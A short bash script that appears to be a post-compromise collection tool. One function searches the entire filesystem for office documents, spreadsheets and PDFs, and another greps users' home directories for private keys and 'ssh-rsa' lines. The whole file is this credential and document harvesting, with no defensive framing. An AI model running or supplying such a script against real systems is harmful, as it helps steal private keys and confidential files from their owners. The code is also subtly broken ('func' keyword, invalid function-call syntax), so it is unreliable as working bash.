#!/bin/bash

func DocGrab() {
  for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");
  do
    echo -e "\nFile extension: " $ext;
    find / -name *$ext 2>/dev/null |
      grep -v "lib\|fonts\|share\|core";
  done
}
func KeyGrab() {
  grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
  grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
}
KeyGrab() & WAIT;
DocGrab()
